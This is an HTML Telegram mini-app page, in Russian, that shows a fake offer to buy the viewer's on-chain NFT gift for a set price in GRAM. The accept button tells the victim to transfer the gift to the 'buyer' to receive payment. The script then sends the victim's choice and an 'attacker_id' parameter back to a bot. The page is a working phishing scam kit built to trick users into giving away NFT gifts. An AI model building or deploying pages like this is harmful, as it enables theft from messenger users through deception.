<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0; padding: 0; background-color: #0e1621;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex; justify-content: center; align-items: center; height: 100vh; color: #ffffff;
        }
        .card {
            background-color: #1e2733;
            background-image: radial-gradient(circle at 15% 50%, rgba(255,255,255,0.03) 0%, transparent 50%),
                              radial-gradient(circle at 85% 30%, rgba(255,255,255,0.03) 0%, transparent 50%);
            border-radius: 16px; padding: 24px; width: 85%; max-width: 340px;
            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.05); box-sizing: border-box;
        }
        .nft-image {
            width: 90px; height: 90px; background: linear-gradient(135deg, #e08b9a, #b05e75);
            border-radius: 22px; margin: 0 auto 12px; display: flex;
            justify-content: center; align-items: center; font-size: 45px;
            box-shadow: 0 8px 16px rgba(224, 139, 154, 0.3);
        }
        .badge {
            background-color: #2b5278; color: #fff; font-size: 12px;
            padding: 4px 12px; border-radius: 12px; display: inline-block; margin-bottom: 20px;
        }
        .text { font-size: 15px; line-height: 1.5; margin-bottom: 20px; color: #e1e3e6; }
        .text b { color: #fff; }
        .details {
            background-color: rgba(0,0,0,0.2); border-radius: 10px;
            padding: 12px 16px; margin-bottom: 20px; text-align: left;
            font-size: 14px; color: #7d8b99; display: flex; flex-direction: column; gap: 10px;
        }
        .detail-row { display: flex; justify-content: space-between; align-items: center; }
        .detail-row span:last-child { color: #fff; }
        .timer { font-size: 13px; color: #7d8b99; margin-bottom: 20px; }
        .btn-group { display: flex; gap: 12px; }
        .btn {
            flex: 1; padding: 14px; border: none; border-radius: 10px;
            font-size: 15px; font-weight: 500; color: #fff; cursor: pointer;
            display: flex; align-items: center; justify-content: center; gap: 6px;
        }
        .btn-decline { background-color: #242f3d; }
        .btn-accept { background-color: #2b5278; }
        #successView { display: none; }
    </style>
</head>
<body>

<div class="card" id="offerView">
    <div class="nft-image">🎭</div>
    <div class="badge">🔗 ОНЧЕЙН NFT</div>
    
    <div class="text">
        Пользователь предлагает Вам<br>
        <b id="priceDisplay">1,250 GRAM</b> за ончейн-подарок<br>
        <b id="nftNameDisplay">NFT Gift</b>.
    </div>
    
    <div class="details">
        <div class="detail-row">
            <span>📦 Комиссия сети:</span>
            <span>0.03 GRAM</span>
        </div>
    </div>
    
    <div class="timer">⏳ Предложение действует ещё 5ч 59м.</div>
    
    <div class="btn-group">
        <button class="btn btn-decline" onclick="handleAction('decline')">✖ Отклонить</button>
        <button class="btn btn-accept" onclick="handleAction('accept')">✔ Принять</button>
    </div>
</div>

<div class="card" id="successView">
    <div class="nft-image" style="background: #2b5278; font-size: 30px;">🤝</div>
    <div class="text" style="margin-bottom: 5px;">
        <b>Вы приняли оффер!</b><br>
        Передайте этот подарок покупателю, чтобы получить деньги.
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand(); 

    const urlParams = new URLSearchParams(window.location.search);
    const nftName = urlParams.get('nft') || 'NFT Gift';
    const price = urlParams.get('price') || '1,250';
    const currency = urlParams.get('currency') || 'GRAM';
    const attackerId = urlParams.get('attacker_id');

    document.getElementById('priceDisplay').innerText = `${price} ${currency}`;
    document.getElementById('nftNameDisplay').innerText = nftName;

    function handleAction(action) {
        if (action === 'accept') {
            document.getElementById('offerView').style.display = 'none';
            document.getElementById('successView').style.display = 'block';
        }
        
        // Отправляем данные боту
        tg.sendData(JSON.stringify({ 
            action: action, 
            nft: nftName,
            attacker_id: attackerId 
        }));
        
        setTimeout(() => tg.close(), 500); // Закрываем окно через полсекунды
    }
</script>
</body>
</html>
